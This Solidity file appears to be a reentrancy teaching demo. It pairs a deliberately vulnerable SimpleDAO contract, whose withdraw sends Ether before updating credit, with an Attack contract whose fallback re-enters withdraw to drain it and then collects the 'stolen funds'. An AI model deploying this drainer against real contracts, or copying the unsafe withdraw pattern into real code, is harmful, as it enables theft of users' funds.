pragma solidity ^0.4.2;

contract Attack {
    SimpleDAO public dao;

    // Set the SimpleDAO contract address
    constructor(address daoAddress) {
        dao = SimpleDAO(daoAddress);
    }

    // Fallback function which gets called when the contract receives Ether
    function() payable {
        if (address(dao).balance >= msg.value) {
            dao.withdraw(msg.value);
        }
    }

    // Function to initiate the attack by donating to self and then withdrawing
    function attack() public payable {
        // Donate to this contract
        dao.donate.value(msg.value)(this);
        // Withdraw to trigger the reentrancy
        dao.withdraw(msg.value);
    }

    // Function to withdraw stolen funds
    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }
}

contract SimpleDAO {
    mapping (address => uint) public credit;

    function donate(address to) payable {
        credit[to] += msg.value;
    }

    function withdraw(uint amount) {
        if (credit[msg.sender] >= amount) {
            bool res = msg.sender.call.value(amount)();
            credit[msg.sender] -= amount;
        }
    }

    function queryCredit(address to) public returns (uint) {
        return credit[to];
    }
}